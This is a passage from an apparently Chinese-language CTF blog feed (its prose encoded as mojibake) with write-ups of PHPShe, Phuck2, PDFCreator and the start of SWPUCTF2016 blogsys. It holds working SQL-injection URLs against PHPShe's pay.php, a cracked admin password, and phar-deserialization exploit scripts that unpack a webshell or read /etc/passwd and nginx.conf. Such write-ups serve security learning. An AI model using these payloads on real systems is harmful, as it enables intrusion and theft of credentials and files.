class="string">'/F1aG_1s_H4r4'</span>));</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æ‹¿åˆ°flagï¼Œé‚£è¿™é¢˜å°±åˆ°è¿™äº†ï¼Œå­¦åˆ°ä¸œè¥¿æ‰æ˜¯çœŸï¼Œflagä¸é‡è¦(233333)</p><h2 id="RoarCTF-2019-PHPShe"><a href="#RoarCTF-2019-PHPShe" class="headerlink" title="[RoarCTF 2019]PHPShe"></a>[RoarCTF 2019]PHPShe</h2><h2 id="çŸ¥è¯†ç‚¹-2"><a href="#çŸ¥è¯†ç‚¹-2" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul><li>æ— åˆ—åæ³¨å…¥</li><li>pharååºåˆ—åŒ–</li><li>ä»£ç å®¡è®¡</li><li>è·å–token</li></ul><h2 id="è§£é¢˜æ­¥éª¤-2"><a href="#è§£é¢˜æ­¥éª¤-2" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>é¢˜ç›®ç»™äº†æºç ï¼Œç›´æ¥ä¸‹è½½</p><p>å¼€é¢˜ï¼Œphpsheä¸€ä¸ªå•†æˆ·æ¡†æ¶ï¼ŒæŸ¥ä¸€ä¸‹CVE(<a href="https://anquan.baidu.com/article/697" target="_blank" rel="noopener">https://anquan.baidu.com/article/697</a>)</p><p>æ¯”è¾ƒæºç ï¼ŒXXE<strong>ï¼ˆCVE-2019-9761ï¼‰</strong>å› ä¸ºåˆ é™¤äº†notify_url.phpè¿™ä¸ªæ–‡ä»¶ï¼Œä¸èƒ½ç”¨</p><p>çœ‹ä¸€ä¸‹<strong>æ— é™åˆ¶SQLæ³¨å…¥åˆ†æï¼ˆCVE-2019-9762ï¼‰</strong>ï¼Œè·Ÿç€æ–‡ç« ä¸€æ­¥æ­¥çœ‹ï¼Œç›´æ¥çœ‹é‡ç‚¹</p><p>æ¼æ´åˆ©ç”¨ç‚¹çš„å…¥å£åœ¨include/plugin/payment/alipay/pay.phpï¼Œè¿™é‡Œæ˜¯å”¯ä¸€æœ‰å›æ˜¾çš„ä½ç½®ï¼Œpocï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,user(),4,5,6,7,8,9,10,11,12%23_</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/6.png" class=""><p>å› ä¸ºè¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œè¿™é‡Œè¦ç”¨åˆ°æ— åˆ—åæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,(<span class="keyword">select</span><span class="string">`3`</span><span class="keyword">from</span>(<span class="keyword">select</span>%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>%<span class="number">20</span><span class="keyword">union</span>%<span class="number">20</span><span class="keyword">select</span>%<span class="number">20</span>*%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">admin</span>)a%<span class="number">20</span><span class="keyword">limit</span>%<span class="number">201</span>,<span class="number">1</span>),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>%<span class="number">23</span>_</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/7.png" class=""><p>æ‹¿åˆ°MD5åŠ å¯†åçš„å¯†ç ï¼Œè§£å¯†å¾—åˆ°admin/altman777ï¼Œç™»å½•åå°</p><p>åœ¨å“ç‰Œç®¡ç†å¤„å‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè¿™é‡Œå› ä¸ºå°±æ˜¯åˆ©ç”¨ç‚¹äº†</p><img src="/2020/08/06/remaining/8.png" class=""><p>æœ¬é¢˜ç›®çš„æºä»£ç åœ¨<code>/include/class/pclzip.class.php</code>å¤šäº†ä¸ªææ„é­”æœ¯æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;extract(PCLZIP_OPT_PATH, <span class="keyword">$this</span>-&gt;save_path);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œåœ¨<code>module/admin/moban.php</code></p><img src="/2020/08/06/remaining/9.png" class=""><p>è¿™ä¸ªç±»èµ·åˆ°è§£å‹ç¼©çš„ä½œç”¨ï¼Œé‚£ä¹ˆåº”è¯¥ä¼šç”¨åˆ°pharåè®®</p><p>åŒæ—¶ï¼Œåœ¨moban.phpä¸­å¯ä»¥çœ‹åˆ°ï¼Œå¼•ç”¨äº†<code>pclzip.class.php</code></p><img src="/2020/08/06/remaining/10.png" class=""><p>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œçœ‹åˆ°äº†delæ–¹æ³•</p><img src="/2020/08/06/remaining/11.png" class=""><p>è·Ÿè¿›ä¸€ä¸‹pe_dirdelæ–¹æ³•</p><img src="/2020/08/06/remaining/12.png" class=""><p>çœ‹åˆ°äº†is_fileï¼Œé‚£ä¹ˆpharçš„è§¦å‘ç‚¹å°±æ‰¾åˆ°äº†</p><p>æ€è·¯æ¸…æ™°äº†ï¼Œé€šè¿‡moban.phpçš„delåŠŸèƒ½ä¼ å…¥<strong>tpl</strong>å‚æ•°ï¼Œé€šè¿‡<strong>is_file</strong>å‡½æ•°è§¦å‘<strong>pharååºåˆ—åŒ–</strong>ï¼Œå¯¹ä¹‹å‰ä¸Šä¼ çš„åŒ…å«shellçš„zipæ–‡ä»¶è¿›è¡Œè§£å‹ç¼©å¾—åˆ°shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PclZip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $zipname = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $zip_fd = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> $error_code = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> $error_string = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $magic_quotes_status;</span><br><span class="line">    <span class="keyword">var</span> $save_path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p_zipname)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zipname = $p_zipname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zip_fd = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;magic_quotes_status = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f=<span class="keyword">new</span> PclZip(<span class="string">"/var/www/html/data/attachment/brand/5.zip"</span>);</span><br><span class="line">$f-&gt;save_path=<span class="string">'/var/www/html/data'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($f);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>,<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($f);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ä¸»è¦çš„å‚æ•°å°±æ˜¯ä¸Šä¼ çš„shellè·¯å¾„ä»¥åŠä¿å­˜çš„è·¯å¾„</strong></p><p>ä¸Šä¼ è·¯å¾„åœ¨ä¸Šä¼ ä¹‹åèƒ½å¤Ÿçœ‹åˆ°</p><img src="/2020/08/06/remaining/13.png" class=""><p>ä¸Šä¼ å°ğŸä¹‹åä¿®æ”¹expä¸­çš„è·¯å¾„å³å¯</p><p>ä¹‹åå†ä¸Šä¼ pharæ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åä¸º1.txt</p><p>è¿™é‡Œè¿˜è¦æ³¨æ„çš„ç‚¹å°±æ˜¯tokençš„è·å–ï¼Œtokenåœ¨å¤‡ä»½çš„æ•°æ®åº“æ¢å¤æ—¶èƒ½å¤Ÿè·å–å¾—åˆ°</p><img src="/2020/08/06/remaining/14.png" class=""><p>è¿™æ ·ä¸€æ¥tokenå°±åˆ°æ‰‹äº†ï¼Œä¹‹åå†å¸¦ä¸Šreferer</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:http://c9ef4168-ae76-49ee-aa39-1808fc8dfd36.node3.buuoj.cn/admin.php?mod=moban</span><br></pre></td></tr></table></figure><p>è¿›è¡Œåˆ é™¤æ“ä½œæ¥è§£å‹ç¼©ä¸Šä¼ çš„å°ğŸå‹ç¼©åŒ…</p><img src="/2020/08/06/remaining/15.png" class=""><p>ä¸‹é¢å°±èƒ½è®¿é—®dataä¸‹çš„å°ğŸæ–‡ä»¶äº†ï¼Œè¯»å–ä¸€ä¸‹æ ¹ç›®å½•æ‰¾åˆ°flagæ–‡ä»¶ï¼Œå†è¯»å–å†…å®¹</p><img src="/2020/08/06/remaining/16.png" class=""><h2 id="Phuck2"><a href="#Phuck2" class="headerlink" title="Phuck2"></a>Phuck2</h2><h3 id="çŸ¥è¯†ç‚¹-3"><a href="#çŸ¥è¯†ç‚¹-3" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>DATA URL</li><li>file_get_contentså’Œincludeå¤„ç†dataï¼šç‰¹æ€§</li></ul><h2 id="è§£é¢˜æ­¥éª¤-3"><a href="#è§£é¢˜æ­¥éª¤-3" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>è¿™é¢˜æ‰“å¼€å…¨æ˜¯ç™½çš„ï¼Œä¸çŸ¥é“æ€ä¹ˆæ•´ï¼Œçœ‹äº†æºç è¦ä¼ å…¥hlå‚æ•°æ‰èƒ½çœ‹åˆ°æºç ï¼Œè¿™è°æƒ³å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    stream_wrapper_unregister(<span class="string">'php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hl'</span>])) highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $mkdir = <span class="function"><span class="keyword">function</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        system(<span class="string">'mkdir -- '</span>.escapeshellarg($dir));</span><br><span class="line">    &#125;;</span><br><span class="line">    $randFolder = bin2hex(random_bytes(<span class="number">16</span>));</span><br><span class="line">    $mkdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    chdir(<span class="string">'users/'</span>.$randFolder);</span><br><span class="line">    $userFolder = (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]) ? $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] : $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $userFolder = basename(str_replace([<span class="string">'.'</span>,<span class="string">'-'</span>],[<span class="string">''</span>,<span class="string">''</span>],$userFolder));</span><br><span class="line">    $mkdir($userFolder);</span><br><span class="line">    chdir($userFolder);</span><br><span class="line">    file_put_contents(<span class="string">'profile'</span>,print_r($_SERVER,<span class="keyword">true</span>));</span><br><span class="line">    chdir(<span class="string">'..'</span>);</span><br><span class="line">    $_GET[<span class="string">'page'</span>]=str_replace(<span class="string">'.'</span>,<span class="string">''</span>,$_GET[<span class="string">'page'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'&lt;?'</span>) &amp;&amp; !stripos(file_get_contents($_GET[<span class="string">'page'</span>]),<span class="string">'php'</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    chdir(<span class="keyword">__DIR__</span>);</span><br><span class="line">    system(<span class="string">'rm -rf users/'</span>.$randFolder);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹å°±banæ‰äº†phpæ•°æ®æµï¼Œåé¢çš„escapeshellargè¿‡æ»¤äº†ä¼ å…¥çš„å‚æ•°ï¼Œç»•ä¸è¿‡</p><p>æ¥ç€å¾€ä¸‹èµ°ï¼Œ<code>X-Forwarded-For</code>å¤´ä¸­çš„ç›®å½•åä¼šèµ‹å€¼ç»™$userFolderï¼Œå¹¶ä¸”è¿‡æ»¤äº†.å’Œ-,ä¸‹é¢å°†æ•°æ®å†™å…¥äº†$userFolder/profileä¸­ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œåœ¨$pageä¸­è¿‡æ»¤äº†ç‚¹å·ï¼Œçœ‹åˆ°äº†includeåº”è¯¥æ˜¯åŒ…å«äº†ï¼Œä¸è¿‡è¿™é‡Œåˆè¿‡æ»¤äº†<code>&lt;?</code>å’Œ<code>php</code></p><p>é‡ç‚¹æ¥äº†ï¼Œå…³äº include ä¸ file_get_contentså¯¹Data URI å¤„ç†ä¸Šçš„é—®é¢˜</p><p>è‡ªå·±å°å°æµ‹è¯•ä¸€æŠŠ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">include</span>(<span class="string">"data:,profile"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span>(file_get_contents(<span class="string">"data:,profile"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/17.png" class=""><p>å¯ä»¥çœ‹åˆ°<code>file_get_content()</code>æ­£å¸¸è¿”å›ï¼Œ<code>include()</code>æŠ¥é”™ï¼Œè¿™é‡Œå¿˜è®°è¯´äº†ï¼Œå½“æ—¶çš„æ¯”èµ›åº”è¯¥ç»™äº†hintï¼Œ<code>allow_url_include = Off,allow_url_fopen = On</code></p><p>åœ¨è¿™ç§æƒ…å†µä¸‹è¦æ€ä¹ˆåšå‘¢ï¼Œè¿™å°±æ˜¯<code>include()</code>åœ¨ä¸å…è®¸åŒ…å«çš„æƒ…å†µä¸‹ï¼Œå¦‚æœè¯´DATA URLæ˜¯ä¸ªç›®å½•æ–‡ä»¶å°±å¯ä»¥ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="keyword">include</span>(<span class="string">"data:,123456/profile"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">print</span>(file_get_contents(<span class="string">"data:,123456/profile"</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/18.png" class=""><p>å¯ä»¥çœ‹åˆ°æ­£å¸¸åŒ…å«äº†ï¼Œè¿”å›äº†1</p><p>è¿™é‡Œå°±å¯ä»¥è¿™æ ·åšäº†</p><img src="/2020/08/06/remaining/19.png" class=""><p>ä¸‹é¢åªéœ€è¦æ›´æ”¹å†™å…¥çš„å†…å®¹æ‰§è¡Œä»£ç ï¼Œè¿™é‡Œä¸ç”¨catè¯»å–å†…å®¹ï¼Œç›´æ¥å¦‚å›¾ä¸­æ‰€ç¤ºå³å¯</p><img src="/2020/08/06/remaining/20.png" class=""><h2 id="Chaos-Communication-Camp-2019-PDFCreator"><a href="#Chaos-Communication-Camp-2019-PDFCreator" class="headerlink" title="[Chaos Communication Camp 2019]PDFCreator"></a>[Chaos Communication Camp 2019]PDFCreator</h2><h3 id="çŸ¥è¯†ç‚¹-4"><a href="#çŸ¥è¯†ç‚¹-4" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>pharååºåˆ—åŒ–</li><li>/etc/nginx/nginx.confé…ç½®ä¿¡æ¯</li></ul><h3 id="è§£é¢˜æ­¥éª¤-4"><a href="#è§£é¢˜æ­¥éª¤-4" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>ç›´æ¥çœ‹ç»™çš„æºç ï¼Œdownä¸€ä»½ä¸‹æ¥</p><p>åœ¨index.phpä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"pdfcontent"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$creator = <span class="keyword">new</span> \PDFStuff\PDFCreator();</span><br><span class="line">$creator-&gt;createPdf($_POST[<span class="string">"pdfcontent"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨PDFStuffå‘½åç©ºé—´ä¸‹æœ‰ä¸€ä¸ªPDFCreatorç±»ï¼Œè·Ÿä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span></span><br><span class="line">&#123;</span><br><span class="line">include 'TCPDF/tcpdf.php';</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PDFCreator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $tmpfile;</span><br><span class="line">   <span class="keyword">public</span> $finalfile;</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;tmpfile))</span><br><span class="line">   &#123;</span><br><span class="line">   $info = pathinfo(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   <span class="keyword">if</span> ($info[<span class="string">'extension'</span>] == <span class="string">"pdf"</span>)</span><br><span class="line">   &#123;</span><br><span class="line">   unlink(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Could not delete created PDF: Not a pdf. Check the file: "</span> . file_get_contents(<span class="keyword">$this</span>-&gt;tmpfile);</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<em>\</em>destruct()é­”æœ¯æ–¹æ³•ä¸­åœ¨åˆ¤æ–­æ–‡ä»¶å­˜åœ¨å¹¶ä¸”ä¸æ˜¯pdfæ–‡ä»¶åï¼Œä¼šåŒ…å«è¿™ä¸ªæ–‡ä»¶è¯»å–å†…å®¹ï¼Œè¿™é‡Œå°±æƒ³åˆ°äº†pharåè®®</p><p>åˆ©ç”¨ç‚¹åœ¨</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Converted by CoolPDF<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>We hope you enjoyed our service!<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"phar://./upload/d7f4be9d064bac5fd42207b3d7efe102_10.jpg"</span> <span class="attr">width</span>=<span class="string">"10"</span> <span class="attr">height</span>=<span class="string">"10"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>srcè¿™é‡Œå¯ä»¥åˆ©ç”¨phar://æ¥è¿›è¡Œè§£æ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PDFStuff</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">PDFCreator</span>&#123;</span><br><span class="line">                public $tmpfile='/etc/passwd';</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$<span class="title">a</span>=<span class="title">new</span> \<span class="title">PDFStuff</span>\<span class="title">PDFCreator</span>();</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar=<span class="keyword">new</span> \Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a'</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($a);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/21.png" class=""><p>è¿™é‡Œè¦æ³¨æ„å¾—æ˜¯webæœåŠ¡ç›®å½•ä¸æ˜¯/var/www/html,å¾—è¯»å–nginxé…ç½®ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><img src="/2020/08/06/remaining/22.png" class=""><p>å¾—åˆ°æ ¹ç›®å½•æ˜¯<code>/var/www/site</code></p><p>è¯»å–ä¹‹å‰æ‰«åˆ°å¾—flag.phpå³å¯</p><img src="/2020/08/06/remaining/23.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Zer0pts2020-musicblog&quot;&gt;&lt;a href=&quot;#Zer0pts2020-musicblog&quot; class=&quot;headerlink&quot; title=&quot;[Zer0pts2020]musicblog&quot;&gt;&lt;/a&gt;[Zer0pts2020]musicblog
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF2016-Web-blogsys</title>
    <link href="http://yoursite.com/2020/08/04/SWPUCTF2016-Web-blogsys/"/>
    <id>http://yoursite.com/2020/08/04/SWPUCTF2016-Web-blogsys/</id>
    <published>2020-08-04T11:18:53.000Z</published>
    <updated>2020-08-06T04:48:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹<a id="more"></a></h2><ul><li>ä»£ç å®¡è®¡åºåˆ—åŒ–</li><li>MD5åŠ ç›</li><li>MD5æ‰©å±•æ”»å‡»</li><li>SQLæ³¨å…¥</li></ul><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>å®˜æ–¹wpè¯´æ˜¯åœ¨/web.zipèƒ½å¤Ÿæ‹¿åˆ°æºç ï¼Œè¿™é‡Œç”¨äº†SYCå’Œdirsearchéƒ½æ²¡æœ‰å‘ç°æœ‰éšè—æ–‡ä»¶ï¼Œç›´æ¥çœ‹äº†æºç </p><p><code>common.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">Array</span>(<span class="string">"_POST"</span>, <span class="string">"_GET"</span>, <span class="string">"_COOKIE"</span>) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$key <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($v)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"hello,hacker!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $k[<span class="number">0</span>] != <span class="string">'_'</span> ? $$k = addslashes($v) : $$k = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå­˜åœ¨å˜é‡è¦†ç›–ï¼Œä½†æ˜¯common.phpæ–‡ä»¶åœ¨å¼€å§‹è¢«å¼•ç”¨ï¼Œåˆ°æœ€åä»£ç å€¼ä¾æ—§ä¼šè¢«é‡æ–°è¦†ç›–ï¼Œä¸èƒ½æ§åˆ¶å˜é‡</p><p><code>riji.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">"common.php"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (@$_SESSION[<span class="string">'login'</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">    header(<span class="string">'Location:/index.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span 